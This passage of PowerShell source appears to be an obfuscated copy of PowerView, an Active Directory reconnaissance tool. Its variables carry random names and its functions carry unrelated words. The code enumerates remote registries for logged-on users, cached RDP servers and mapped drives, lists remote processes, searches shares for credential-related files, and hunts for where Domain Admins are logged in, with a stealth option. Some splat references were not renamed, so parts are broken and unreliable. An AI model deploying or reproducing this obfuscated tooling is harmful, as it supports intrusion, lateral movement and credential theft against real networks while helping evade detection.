        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($GucPfsvo99 in $kyzUdCPm99) {
            $HKLM = 2147483650
            $BlMYAAzq99 = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $GucPfsvo99
                'ErrorAction' = 'SilentlyContinue'
            }
            if ($PSBoundParameters['Credential']) { $BlMYAAzq99['Credential'] = $DOZPHpup99 }
            try {
                $Reg = Get-WmiObject @WmiArguments
                $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI'
                $Value = 'LastLoggedOnUser'
                $fcgjNBLf99 = $Reg.GetStringValue($HKLM, $Key, $Value).sValue
                $SdgTVDHV99 = New-Object PSObject
                $SdgTVDHV99 | Add-Member Noteproperty 'ComputerName' $GucPfsvo99
                $SdgTVDHV99 | Add-Member Noteproperty 'LastLoggedOn' $fcgjNBLf99
                $SdgTVDHV99.PSObject.TypeNames.Insert(0, 'PowerView.LastLoggedOnUser')
                $SdgTVDHV99
            }
            catch {
                Write-Warning "[dropsy] Error opening remote registry on $GucPfsvo99. Remote registry likely not enabled."
            }
        }
    }
}
function flopping {
    [OutputType('PowerView.CachedRDPConnection')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $kyzUdCPm99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($GucPfsvo99 in $kyzUdCPm99) {
            $HKU = 2147483651
            $BlMYAAzq99 = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $GucPfsvo99
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $BlMYAAzq99['Credential'] = $DOZPHpup99 }
            try {
                $Reg = Get-WmiObject @WmiArguments
                $NOUBMkGc99 = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }
                ForEach ($jgPaiIrE99 in $NOUBMkGc99) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $rYdFULpQ99 = bandaging -aDsLribc99 $jgPaiIrE99 -DOZPHpup99 $DOZPHpup99
                        }
                        else {
                            $rYdFULpQ99 = bandaging -aDsLribc99 $jgPaiIrE99
                        }
                        $TOfjMrmt99 = $Reg.EnumValues($HKU,"$jgPaiIrE99\Software\Microsoft\Terminal Server Client\Default").sNames
                        ForEach ($qXjEVahT99 in $TOfjMrmt99) {
                            if ($qXjEVahT99 -match 'MRU.*') {
                                $dlFSbzeo99 = $Reg.GetStringValue($HKU, "$jgPaiIrE99\Software\Microsoft\Terminal Server Client\Default", $qXjEVahT99).sValue
                                $fCJMFcQP99 = New-Object PSObject
                                $fCJMFcQP99 | Add-Member Noteproperty 'ComputerName' $GucPfsvo99
                                $fCJMFcQP99 | Add-Member Noteproperty 'UserName' $rYdFULpQ99
                                $fCJMFcQP99 | Add-Member Noteproperty 'UserSID' $jgPaiIrE99
                                $fCJMFcQP99 | Add-Member Noteproperty 'TargetServer' $dlFSbzeo99
                                $fCJMFcQP99 | Add-Member Noteproperty 'UsernameHint' $Null
                                $fCJMFcQP99.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                                $fCJMFcQP99
                            }
                        }
                        $rIAiQLwd99 = $Reg.EnumKey($HKU,"$jgPaiIrE99\Software\Microsoft\Terminal Server Client\Servers").sNames
                        ForEach ($YdBDxrjg99 in $rIAiQLwd99) {
                            $BEztQLsp99 = $Reg.GetStringValue($HKU, "$jgPaiIrE99\Software\Microsoft\Terminal Server Client\Servers\$YdBDxrjg99", 'UsernameHint').sValue
                            $fCJMFcQP99 = New-Object PSObject
                            $fCJMFcQP99 | Add-Member Noteproperty 'ComputerName' $GucPfsvo99
                            $fCJMFcQP99 | Add-Member Noteproperty 'UserName' $rYdFULpQ99
                            $fCJMFcQP99 | Add-Member Noteproperty 'UserSID' $jgPaiIrE99
                            $fCJMFcQP99 | Add-Member Noteproperty 'TargetServer' $YdBDxrjg99
                            $fCJMFcQP99 | Add-Member Noteproperty 'UsernameHint' $BEztQLsp99
                            $fCJMFcQP99.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                            $fCJMFcQP99
                        }
                    }
                    catch {
                        Write-Verbose "[flopping] Error: $_"
                    }
                }
            }
            catch {
                Write-Warning "[flopping] Error accessing $GucPfsvo99, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}
function womanize {
    [OutputType('PowerView.RegMountedDrive')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $kyzUdCPm99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($GucPfsvo99 in $kyzUdCPm99) {
            $HKU = 2147483651
            $BlMYAAzq99 = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $GucPfsvo99
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $BlMYAAzq99['Credential'] = $DOZPHpup99 }
            try {
                $Reg = Get-WmiObject @WmiArguments
                $NOUBMkGc99 = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }
                ForEach ($jgPaiIrE99 in $NOUBMkGc99) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $rYdFULpQ99 = bandaging -aDsLribc99 $jgPaiIrE99 -DOZPHpup99 $DOZPHpup99
                        }
                        else {
                            $rYdFULpQ99 = bandaging -aDsLribc99 $jgPaiIrE99
                        }
                        $UMIbkpzM99 = ($Reg.EnumKey($HKU, "$jgPaiIrE99\Network")).sNames
                        ForEach ($fZGRBJtk99 in $UMIbkpzM99) {
                            $DoMpnIEh99 = $Reg.GetStringValue($HKU, "$jgPaiIrE99\Network\$fZGRBJtk99", 'ProviderName').sValue
                            $xAvPqIPc99 = $Reg.GetStringValue($HKU, "$jgPaiIrE99\Network\$fZGRBJtk99", 'RemotePath').sValue
                            $uGTdOWJa99 = $Reg.GetStringValue($HKU, "$jgPaiIrE99\Network\$fZGRBJtk99", 'UserName').sValue
                            if (-not $rYdFULpQ99) { $rYdFULpQ99 = '' }
                            if ($xAvPqIPc99 -and ($xAvPqIPc99 -ne '')) {
                                $PYbCALkI99 = New-Object PSObject
                                $PYbCALkI99 | Add-Member Noteproperty 'ComputerName' $GucPfsvo99
                                $PYbCALkI99 | Add-Member Noteproperty 'UserName' $rYdFULpQ99
                                $PYbCALkI99 | Add-Member Noteproperty 'UserSID' $jgPaiIrE99
                                $PYbCALkI99 | Add-Member Noteproperty 'DriveLetter' $fZGRBJtk99
                                $PYbCALkI99 | Add-Member Noteproperty 'ProviderName' $DoMpnIEh99
                                $PYbCALkI99 | Add-Member Noteproperty 'RemotePath' $xAvPqIPc99
                                $PYbCALkI99 | Add-Member Noteproperty 'DriveUserName' $uGTdOWJa99
                                $PYbCALkI99.PSObject.TypeNames.Insert(0, 'PowerView.RegMountedDrive')
                                $PYbCALkI99
                            }
                        }
                    }
                    catch {
                        Write-Verbose "[womanize] Error: $_"
                    }
                }
            }
            catch {
                Write-Warning "[womanize] Error accessing $GucPfsvo99, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}
function amiss {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $kyzUdCPm99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($GucPfsvo99 in $kyzUdCPm99) {
            try {
                $BlMYAAzq99 = @{
                    'ComputerName' = $kyzUdCPm99
                    'Class' = 'Win32_process'
                }
                if ($PSBoundParameters['Credential']) { $BlMYAAzq99['Credential'] = $DOZPHpup99 }
                Get-WMIobject @WmiArguments | ForEach-Object {
                    $Owner = $_.getowner();
                    $aXyFQkCP99 = New-Object PSObject
                    $aXyFQkCP99 | Add-Member Noteproperty 'ComputerName' $GucPfsvo99
                    $aXyFQkCP99 | Add-Member Noteproperty 'ProcessName' $_.ProcessName
                    $aXyFQkCP99 | Add-Member Noteproperty 'ProcessID' $_.ProcessID
                    $aXyFQkCP99 | Add-Member Noteproperty 'Domain' $Owner.Domain
                    $aXyFQkCP99 | Add-Member Noteproperty 'User' $Owner.User
                    $aXyFQkCP99.PSObject.TypeNames.Insert(0, 'PowerView.UserProcess')
                    $aXyFQkCP99
                }
            }
            catch {
                Write-Verbose "[amiss] Error enumerating remote processes on '$GucPfsvo99', access likely denied: $_"
            }
        }
    }
}
function stymies {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path = '.\',
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $vugWCwdj99 = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $tNUzVTqs99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $didbIniG99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $XHepuroO99,
        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $gGeTXttX99,
        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $ANECuiNi99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $IxLsDMwl99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $ZyPINuEG99,
        [Switch]
        $DuVFuYUj99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $zLdPCUTB99 =  @{
            'Recurse' = $True
            'ErrorAction' = 'SilentlyContinue'
            'Include' = $vugWCwdj99
        }
        if ($PSBoundParameters['OfficeDocs']) {
            $zLdPCUTB99['Include'] = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
        }
        elseif ($PSBoundParameters['FreshEXEs']) {
            $tNUzVTqs99 = (Get-Date).AddDays(-7).ToString('MM/dd/yyyy')
            $zLdPCUTB99['Include'] = @('*.exe')
        }
        $zLdPCUTB99['Force'] = -not $PSBoundParameters['ExcludeHidden']
        $gnbmJgNr99 = @{}
        function hellhole {
            [CmdletBinding()]Param([String]$Path)
            try {
                $UejrQyGd99 = [IO.File]::OpenWrite($Path)
                $UejrQyGd99.Close()
                $True
            }
            catch {
                $False
            }
        }
    }
    PROCESS {
        ForEach ($mLpzMLwf99 in $Path) {
            if (($mLpzMLwf99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $QpWiCdMP99 = (New-Object System.Uri($mLpzMLwf99)).Host
                if (-not $gnbmJgNr99[$QpWiCdMP99]) {
                    demilitarized -kyzUdCPm99 $QpWiCdMP99 -DOZPHpup99 $DOZPHpup99
                    $gnbmJgNr99[$QpWiCdMP99] = $True
                }
            }
            $zLdPCUTB99['Path'] = $mLpzMLwf99
            Get-ChildItem @SearcherArguments | ForEach-Object {
                $GhkRRrRC99 = $True
                if ($PSBoundParameters['ExcludeFolders'] -and ($_.PSIsContainer)) {
                    Write-Verbose "Excluding: $($_.FullName)"
                    $GhkRRrRC99 = $False
                }
                if ($tNUzVTqs99 -and ($_.LastAccessTime -lt $tNUzVTqs99)) {
                    $GhkRRrRC99 = $False
                }
                if ($PSBoundParameters['LastWriteTime'] -and ($_.LastWriteTime -lt $didbIniG99)) {
                    $GhkRRrRC99 = $False
                }
                if ($PSBoundParameters['CreationTime'] -and ($_.CreationTime -lt $XHepuroO99)) {
                    $GhkRRrRC99 = $False
                }
                if ($PSBoundParameters['CheckWriteAccess'] -and (-not (hellhole -Path $_.FullName))) {
                    $GhkRRrRC99 = $False
                }
                if ($GhkRRrRC99) {
                    $fbCiLIMO99 = @{
                        'Path' = $_.FullName
                        'Owner' = $((Get-Acl $_.FullName).Owner)
                        'LastAccessTime' = $_.LastAccessTime
                        'LastWriteTime' = $_.LastWriteTime
                        'CreationTime' = $_.CreationTime
                        'Length' = $_.Length
                    }
                    $EcxrMIdi99 = New-Object -TypeName PSObject -Property $fbCiLIMO99
                    $EcxrMIdi99.PSObject.TypeNames.Insert(0, 'PowerView.FoundFile')
                    $EcxrMIdi99
                }
            }
        }
    }
    END {
        $gnbmJgNr99.Keys | calibrating
    }
}
function prohibits {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [String[]]
        $kyzUdCPm99,
        [Parameter(Position = 1, Mandatory = $True)]
        [System.Management.Automation.ScriptBlock]
        $nkMTuquD99,
        [Parameter(Position = 2)]
        [Hashtable]
        $PdoqDAIx99,
        [Int]
        [ValidateRange(1,  100)]
        $tKOqLWOE99 = 20,
        [Switch]
        $GCKvxaJP99
    )
    BEGIN {
        $swkAdDzD99 = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $swkAdDzD99.ApartmentState = [System.Threading.ApartmentState]::STA
        if (-not $GCKvxaJP99) {
            $cVEkCbpQ99 = Get-Variable -Scope 2
            $JNwXcRHn99 = @('?','args','ConsoleFileName','Error','ExecutionContext','false','HOME','Host','input','InputObject','MaximumAliasCount','MaximumDriveCount','MaximumErrorCount','MaximumFunctionCount','MaximumHistoryCount','MaximumVariableCount','MyInvocation','null','PID','PSBoundParameters','PSCommandPath','PSCulture','PSDefaultParameterValues','PSHOME','PSScriptRoot','PSUICulture','PSVersionTable','PWD','ShellId','SynchronizedHash','true')
            ForEach ($Var in $cVEkCbpQ99) {
                if ($JNwXcRHn99 -NotContains $Var.Name) {
                $swkAdDzD99.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                }
            }
            ForEach ($AToJXoKV99 in (Get-ChildItem Function:)) {
                $swkAdDzD99.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $AToJXoKV99.Name, $AToJXoKV99.Definition))
            }
        }
        $Pool = [RunspaceFactory]::CreateRunspacePool(1, $tKOqLWOE99, $swkAdDzD99, $Host)
        $Pool.Open()
        $GxydJySm99 = $Null
        ForEach ($M in [PowerShell].GetMethods() | Where-Object { $_.Name -eq 'BeginInvoke' }) {
            $kWuvURVw99 = $M.GetParameters()
            if (($kWuvURVw99.Count -eq 2) -and $kWuvURVw99[0].Name -eq 'input' -and $kWuvURVw99[1].Name -eq 'output') {
                $GxydJySm99 = $M.MakeGenericMethod([Object], [Object])
                break
            }
        }
        $Jobs = @()
        $kyzUdCPm99 = $kyzUdCPm99 | Where-Object {$_ -and $_.Trim()}
        Write-Verbose "[prohibits] Total number of hosts: $($kyzUdCPm99.count)"
        if ($tKOqLWOE99 -ge $kyzUdCPm99.Length) {
            $tKOqLWOE99 = $kyzUdCPm99.Length
        }
        $CmxAKFUh99 = [Int]($kyzUdCPm99.Length/$tKOqLWOE99)
        $WocANLgu99 = @()
        $Start = 0
        $End = $CmxAKFUh99
        for($i = 1; $i -le $tKOqLWOE99; $i++) {
            $List = New-Object System.Collections.ArrayList
            if ($i -eq $tKOqLWOE99) {
                $End = $kyzUdCPm99.Length
            }
            $List.AddRange($kyzUdCPm99[$Start..($End-1)])
            $Start += $CmxAKFUh99
            $End += $CmxAKFUh99
            $WocANLgu99 += @(,@($List.ToArray()))
        }
        Write-Verbose "[prohibits] Total number of threads/partitions: $tKOqLWOE99"
        ForEach ($FQlzCmLa99 in $WocANLgu99) {
            $urtiIDIr99 = [PowerShell]::Create()
            $urtiIDIr99.runspacepool = $Pool
            $Null = $urtiIDIr99.AddScript($nkMTuquD99).AddParameter('ComputerName', $FQlzCmLa99)
            if ($PdoqDAIx99) {
                ForEach ($Param in $PdoqDAIx99.GetEnumerator()) {
                    $Null = $urtiIDIr99.AddParameter($Param.Name, $Param.Value)
                }
            }
            $wzSptcsg99 = New-Object Management.Automation.PSDataCollection[Object]
            $Jobs += @{
                PS = $urtiIDIr99
                Output = $wzSptcsg99
                Result = $GxydJySm99.Invoke($urtiIDIr99, @($Null, [Management.Automation.PSDataCollection[Object]]$wzSptcsg99))
            }
        }
    }
    END {
        Write-Verbose "[prohibits] Threads executing"
        Do {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
            }
            Start-Sleep -Seconds 1
        }
        While (($Jobs | Where-Object { -not $_.Result.IsCompleted }).Count -gt 0)
        $FSMcqvsk99 = 100
        Write-Verbose "[prohibits] Waiting $FSMcqvsk99 seconds for final cleanup..."
        for ($i=0; $i -lt $FSMcqvsk99; $i++) {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
                $Job.PS.Dispose()
            }
            Start-Sleep -S 1
        }
        $Pool.Dispose()
        Write-Verbose "[prohibits] all threads completed"
    }
}
function telexed {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserLocation')]
    [CmdletBinding(DefaultParameterSetName = 'UserGroupIdentity')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $kyzUdCPm99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [String]
        $rWNKtRhC99,
        [ValidateNotNullOrEmpty()]
        [String]
        $NVeRyhya99,
        [ValidateNotNullOrEmpty()]
        [String]
        $IwyMamDv99,
        [Alias('Unconstrained')]
        [Switch]
        $sihUJTgN99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $QQiShXII99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $SnjbhqHK99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $gsQnsIwP99,
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $GMxPBqaF99,
        [ValidateNotNullOrEmpty()]
        [String]
        $BUwbCXsa99,
        [ValidateNotNullOrEmpty()]
        [String]
        $BuGyErks99,
        [ValidateNotNullOrEmpty()]
        [String]
        $ZfUQuSoq99,
        [Parameter(ParameterSetName = 'UserGroupIdentity')]
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $IFhNxjOg99 = 'Domain Admins',
        [Alias('AdminCount')]
        [Switch]
        $JYtTYuqv99,
        [Alias('AllowDelegation')]
        [Switch]
        $FYjSODci99,
        [Switch]
        $QonjCJkk99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [Switch]
        $CnaAXLuN99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $QkcKhzFA99,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $wVJhboDL99 = .3,
        [Parameter(ParameterSetName = 'ShowAll')]
        [Switch]
        $gwtWSmbJ99,
        [Switch]
        $AKQEQUbD99,
        [String]
        [ValidateSet('DFS', 'DC', 'File', 'All')]
        $hnKczNfd99 = 'All',
        [Int]
        [ValidateRange(1, 100)]
        $tKOqLWOE99 = 20
    )
    BEGIN {
        $rkhpGCag99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['Domain']) { $rkhpGCag99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['ComputerDomain']) { $rkhpGCag99['Domain'] = $rWNKtRhC99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $rkhpGCag99['LDAPFilter'] = $NVeRyhya99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $rkhpGCag99['SearchBase'] = $IwyMamDv99 }
        if ($PSBoundParameters['Unconstrained']) { $rkhpGCag99['Unconstrained'] = $xbKFrKFs99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $rkhpGCag99['OperatingSystem'] = $cHJdXVHn99 }
        if ($PSBoundParameters['ComputerServicePack']) { $rkhpGCag99['ServicePack'] = $kVBIYPdx99 }
        if ($PSBoundParameters['ComputerSiteName']) { $rkhpGCag99['SiteName'] = $TQljdANP99 }
        if ($PSBoundParameters['Server']) { $rkhpGCag99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $rkhpGCag99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $rkhpGCag99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $rkhpGCag99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Tombstone']) { $rkhpGCag99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $rkhpGCag99['Credential'] = $DOZPHpup99 }
        $BuvdgfSf99 = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $BuvdgfSf99['Identity'] = $GMxPBqaF99 }
        if ($PSBoundParameters['Domain']) { $BuvdgfSf99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['UserDomain']) { $BuvdgfSf99['Domain'] = $BUwbCXsa99 }
        if ($PSBoundParameters['UserLDAPFilter']) { $BuvdgfSf99['LDAPFilter'] = $BuGyErks99 }
        if ($PSBoundParameters['UserSearchBase']) { $BuvdgfSf99['SearchBase'] = $ZfUQuSoq99 }
        if ($PSBoundParameters['UserAdminCount']) { $BuvdgfSf99['AdminCount'] = $JYtTYuqv99 }
        if ($PSBoundParameters['UserAllowDelegation']) { $BuvdgfSf99['AllowDelegation'] = $FYjSODci99 }
        if ($PSBoundParameters['Server']) { $BuvdgfSf99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $BuvdgfSf99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $BuvdgfSf99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $BuvdgfSf99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Tombstone']) { $BuvdgfSf99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $BuvdgfSf99['Credential'] = $DOZPHpup99 }
        $yfurrppc99 = @()
        if ($PSBoundParameters['ComputerName']) {
            $yfurrppc99 = @($kyzUdCPm99)
        }
        else {
            if ($PSBoundParameters['Stealth']) {
                Write-Verbose "[telexed] Stealth enumeration using source: $hnKczNfd99"
                $JcVjBeMe99 = New-Object System.Collections.ArrayList
                if ($hnKczNfd99 -match 'File|All') {
                    Write-Verbose '[telexed] Querying for file servers'
                    $efMpaRoq99 = @{}
                    if ($PSBoundParameters['Domain']) { $efMpaRoq99['Domain'] = $jeGdZvYa99 }
                    if ($PSBoundParameters['ComputerDomain']) { $efMpaRoq99['Domain'] = $rWNKtRhC99 }
                    if ($PSBoundParameters['ComputerSearchBase']) { $efMpaRoq99['SearchBase'] = $IwyMamDv99 }
                    if ($PSBoundParameters['Server']) { $efMpaRoq99['Server'] = $YdBDxrjg99 }
                    if ($PSBoundParameters['SearchScope']) { $efMpaRoq99['SearchScope'] = $eLpWCwqM99 }
                    if ($PSBoundParameters['ResultPageSize']) { $efMpaRoq99['ResultPageSize'] = $xRYvUWYi99 }
                    if ($PSBoundParameters['ServerTimeLimit']) { $efMpaRoq99['ServerTimeLimit'] = $vqNdfRPs99 }
                    if ($PSBoundParameters['Tombstone']) { $efMpaRoq99['Tombstone'] = $CnaAXLuN99 }
                    if ($PSBoundParameters['Credential']) { $efMpaRoq99['Credential'] = $DOZPHpup99 }
                    $hmdcGqTu99 = Augustan @FileServerSearcherArguments
                    if ($hmdcGqTu99 -isnot [System.Array]) { $hmdcGqTu99 = @($hmdcGqTu99) }
                    $JcVjBeMe99.AddRange( $hmdcGqTu99 )
                }
                if ($hnKczNfd99 -match 'DFS|All') {
                    Write-Verbose '[telexed] Querying for DFS servers'
                }
                if ($hnKczNfd99 -match 'DC|All') {
                    Write-Verbose '[telexed] Querying for domain controllers'
                    $PRJYJLsQ99 = @{
                        'LDAP' = $True
                    }
                    if ($PSBoundParameters['Domain']) { $PRJYJLsQ99['Domain'] = $jeGdZvYa99 }
                    if ($PSBoundParameters['ComputerDomain']) { $PRJYJLsQ99['Domain'] = $rWNKtRhC99 }
                    if ($PSBoundParameters['Server']) { $PRJYJLsQ99['Server'] = $YdBDxrjg99 }
                    if ($PSBoundParameters['Credential']) { $PRJYJLsQ99['Credential'] = $DOZPHpup99 }
                    $YDhLbxSO99 = shriller @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
                    if ($YDhLbxSO99 -isnot [System.Array]) { $YDhLbxSO99 = @($YDhLbxSO99) }
                    $JcVjBeMe99.AddRange( $YDhLbxSO99 )
                }
                $yfurrppc99 = $JcVjBeMe99.ToArray()
            }
            else {
                Write-Verbose '[telexed] Querying for all computers in the domain'
                $yfurrppc99 = boozed @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
            }
        }
        Write-Verbose "[telexed] TargetComputers length: $($yfurrppc99.Length)"
        if ($yfurrppc99.Length -eq 0) {
            throw '[telexed] No hosts found to enumerate'
        }
        if ($PSBoundParameters['Credential']) {
            $OovKwvOv99 = $DOZPHpup99.GetNetworkCredential().UserName
        }
        else {
            $OovKwvOv99 = ([Environment]::UserName).ToLower()
        }
        if ($PSBoundParameters['ShowAll']) {
            $RRdVovJL99 = @()
        }
        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
            $RRdVovJL99 = togae @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $IjNRsCVr99 = @{
                'Identity' = $IFhNxjOg99
                'Recurse' = $True
            }
            if ($PSBoundParameters['UserDomain']) { $IjNRsCVr99['Domain'] = $BUwbCXsa99 }
            if ($PSBoundParameters['UserSearchBase']) { $IjNRsCVr99['SearchBase'] = $ZfUQuSoq99 }
            if ($PSBoundParameters['Server']) { $IjNRsCVr99['Server'] = $YdBDxrjg99 }
            if ($PSBoundParameters['SearchScope']) { $IjNRsCVr99['SearchScope'] = $eLpWCwqM99 }
            if ($PSBoundParameters['ResultPageSize']) { $IjNRsCVr99['ResultPageSize'] = $xRYvUWYi99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $IjNRsCVr99['ServerTimeLimit'] = $vqNdfRPs99 }
            if ($PSBoundParameters['Tombstone']) { $IjNRsCVr99['Tombstone'] = $CnaAXLuN99 }
            if ($PSBoundParameters['Credential']) { $IjNRsCVr99['Credential'] = $DOZPHpup99 }
            $RRdVovJL99 = expostulation @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }
        Write-Verbose "[telexed] TargetUsers length: $($RRdVovJL99.Length)"
        if ((-not $gwtWSmbJ99) -and ($RRdVovJL99.Length -eq 0)) {
            throw '[telexed] No users found to target'
        }
        $NhmrWRhM99 = {
            Param($kyzUdCPm99, $RRdVovJL99, $OovKwvOv99, $AKQEQUbD99, $ojJXfOPB99)
            if ($ojJXfOPB99) {
                $Null = Salem -ojJXfOPB99 $ojJXfOPB99 -Quiet
            }
            ForEach ($WtURHswp99 in $kyzUdCPm99) {
                $Up = Test-Connection -Count 1 -Quiet -kyzUdCPm99 $WtURHswp99
                if ($Up) {
                    $nEKIDCXF99 = disservice -kyzUdCPm99 $WtURHswp99
                    ForEach ($JSaXNbjy99 in $nEKIDCXF99) {
                        $rYdFULpQ99 = $JSaXNbjy99.UserName
                        $CName = $JSaXNbjy99.CName
                        if ($CName -and $CName.StartsWith('\\')) {
                            $CName = $CName.TrimStart('\')
                        }
